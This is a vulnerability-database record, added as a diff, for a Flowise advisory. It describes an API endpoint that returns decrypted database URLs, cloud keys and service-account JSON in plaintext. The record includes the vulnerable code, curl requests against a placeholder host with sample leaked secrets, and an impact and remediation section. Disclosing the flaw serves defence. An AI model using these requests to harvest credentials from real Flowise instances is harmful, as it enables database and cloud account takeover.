@@ -1,0 +1,192 @@
+[basic]
+description = '''
+## Summary
+
+The `GET /api/v1/credentials/:id` endpoint decrypts stored credential data and returns it in the `plainDataObj` field of the API response. While a `redactCredentialWithPasswordType()` function masks fields defined with `type: 'password'` in their component schema, many credential types store highly sensitive data (database connection URLs with embedded passwords, Google service account JSON with RSA private keys, AWS access keys) in fields defined as `type: 'string'`. These string-type fields are returned in **full plaintext** without any redaction.
+
+Any authenticated user with `credentials:view` permission can retrieve the raw secrets of any credential in their workspace by calling this endpoint.
+
+## Vulnerable Code
+
+### Service Layer
+
+**`packages/server/src/services/credentials/index.ts`**, `getCredentialById()` (line 127):
+
+At line 138, the credential's encrypted data is decrypted:
+
+```typescript
+const decryptedCredentialData = await decryptCredentialData(
+    credential.encryptedData,
+    credential.credentialName,
+    appServer.nodesPool.componentCredentials
+)
+```
+
+At lines 143-146, the decrypted data is attached to the response as `plainDataObj`:
+
+```typescript
+const returnCredential: ICredentialReturnResponse = {
+    ...credential,
+    plainDataObj: decryptedCredentialData    // <-- decrypted secrets in response
+}
+```
+
+At line 147, only `encryptedData` is stripped, leaving `plainDataObj` intact:
+
+```typescript
+const dbResponse: any = omit(returnCredential, ['encryptedData'])
+```
+
+### Incomplete Redaction
+
+**`packages/server/src/utils/index.ts`**, `redactCredentialWithPasswordType()` (line 1697):
+
+```typescript
+export const redactCredentialWithPasswordType = (
+    componentCredentialName: string,
+    decryptedCredentialObj: ICredentialDataDecrypted,
+    componentCredentials: IComponentCredentials
+): ICredentialDataDecrypted => {
+    const plainDataObj = cloneDeep(decryptedCredentialObj)
+    for (const cred in plainDataObj) {
+        const inputParam = componentCredentials[componentCredentialName].inputs?.find(
+            (inp) => inp.type === 'password' && inp.name === cred  // <-- only 'password' type
+        )
+        if (inputParam) {
+            plainDataObj[cred] = REDACTED_CREDENTIAL_VALUE
+        }
+    }
+    return plainDataObj
+}
+```
+
+This function **only** redacts fields where `inp.type === 'password'`. Fields with `type: 'string'` are returned verbatim, even when they contain secrets.
+
+### Credential Definitions Storing Secrets in String-Type Fields
+
+| Credential | Field | Type | Contains |
+|---|---|---|---|
+| `mongoDBUrlApi` | `mongoDBConnectUrl` | `string` | `mongodb+srv://user:password@host/db` |
+| `googleVertexAuth` | `googleApplicationCredential` | `string` | Full service account JSON with RSA private key |
+| `postgresUrl` | `postgresUrl` | `string` | `postgresql://user:password@host/db` |
+| `redisCacheUrlApi` | `redisUrl` | `string` | `redis://user:password@host:port` |
+| `awsApi` | `awsKey` | `string` | AWS Access Key ID |
+| `langfuseApi` | `langFusePublicKey` | `string` | Langfuse API public key |
+| `httpBasicAuth` | `basicAuthUsername` | `string` | HTTP Basic Auth username |
+
+There are 60+ credential definitions in `packages/components/credentials/`, many with sensitive string-type fields.
+
+## Proof of Concept
+
+### Environment
+
+- Flowise v3.0.13 (`flowiseai/flowise:latest` Docker image)
+- Authenticated as admin user via enterprise auth
+
+### Steps to Reproduce
+
+1. Start Flowise and log in as any user with `credentials:view` permission.
+2. Create a MongoDB credential with a connection URL containing embedded credentials:
+
+```bash
+curl -X POST \"http://TARGET:3000/api/v1/credentials\" \
+  -H \"Content-Type: application/json\" \
+  -H \"x-request-from: internal\" \
+  -H \"Cookie: token=<jwt-token>\" \
+  -d '{
+    \"name\": \"MongoDB Production\",
+    \"credentialName\": \"mongoDBUrlApi\",
+    \"plainDataObj\": {
+      \"mongoDBConnectUrl\": \"mongodb+srv://admin:SuperSecretPassword123@cluster0.abc123.mongodb.net/mydb\"
+    }
+  }'
+```
+
+3. Retrieve the credential by ID:
+
+```bash
+curl -X GET \"http://TARGET:3000/api/v1/credentials/<credential-id>\" \
+  -H \"x-request-from: internal\" \
+  -H \"Cookie: token=<jwt-token>\"
+```
+
+### Observed Result
+
+The API returns the MongoDB connection URL in **full plaintext**, including the embedded password:
+
+```json
+{
+  \"id\": \"e9543cad-8c0c-422e-9990-090c3b1dc3ab\",
+  \"name\": \"MongoDB Production\",
+  \"credentialName\": \"mongoDBUrlApi\",
+  \"createdDate\": \"2026-02-07T17:35:29.000Z\",
+  \"updatedDate\": \"2026-02-07T17:35:29.000Z\",
+  \"plainDataObj\": {
+    \"mongoDBConnectUrl\": \"mongodb+srv://admin:SuperSecretPassword123@cluster0.abc123.mongodb.net/mydb\"
+  }
+}
+```
+
+The same test with a Google Vertex Auth credential returned the **complete service account JSON including the RSA private key** in plaintext:
+
+```json
+{
+  \"id\": \"f7768444-a4fc-4fa3-8e5e-d0d4df89fb56\",
+  \"name\": \"Google Vertex Auth\",
+  \"credentialName\": \"googleVertexAuth\",
+  \"plainDataObj\": {
+    \"googleApplicationCredential\": \"{\\"type\\":\\"service_account\\",\\"private_key\\":\\"-----BEGIN RSA PRIVATE KEY-----\\nMIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWep4PAtGoL3VBpFe97XRQFQB\\n-----END RSA PRIVATE KEY-----\\n\\",\\"client_email\\":\\"mybot@my-project-123.iam.gserviceaccount.com\\"}\",
+    \"projectID\": \"my-project-123\"
+  }
+}
+```
+
+For comparison, an OpenAI API key (where the field is typed as `password`) was **correctly redacted**:
+
+```json
+{
+  \"plainDataObj\": {
+    \"openAIApiKey\": \"_FLOWISE_BLANK_07167752-1a71-43b1-\"
+  }
+}
+```
+
+This confirms the redaction is only applied to `password`-type fields, leaving `string`-type fields fully exposed.
+
+## Impact
+
+- **Database credential theft**: MongoDB, PostgreSQL, Redis, MySQL connection URLs with embedded passwords are returned in full plaintext. An attacker can use these to directly access production databases.
+- **Cloud service account compromise**: Google service account JSON with RSA private keys is returned in plaintext, enabling full impersonation of the service account across Google Cloud.
+- **AWS key exposure**: AWS Access Key IDs stored in `string`-type fields are exposed, enabling enumeration of active AWS credentials.
+- **Lateral movement**: Stolen credentials enable pivoting from the Flowise instance to connected cloud services, databases, and APIs.
+- **Multi-user workspace risk**: In multi-user deployments, any user with `credentials:view` permission can harvest all workspace credentials via the API.
+
+## Remediation
+
+1. Apply `redactCredentialWithPasswordType()` to **all** sensitive credential fields, not just those typed as `password`. Any field containing secrets (connection strings, JSON credentials, access keys) should be redacted.
+2. Consider never returning `plainDataObj` in API responses. The UI should use masked previews (e.g., `mongodb+srv://admin:****@cluster0...`) instead of full values.
+3. Re-type sensitive credential fields from `string` to `password` in component credential definitions to ensure they are covered by the existing redaction logic.
+4. Add a separate `secret: true` flag to credential field definitions to explicitly mark sensitive fields regardless of their input type.
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Flowise: Incomplete Credential Redaction Exposes Secrets via API"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-rwrp-9823-p2xq"]
+ave_id = "AVE-2026-1245"
+
+[meta]
+collected_at = "2026-08-06T16:16:38.059843064+00:00"
+status = "completed"
+
+[references]
+urls = []
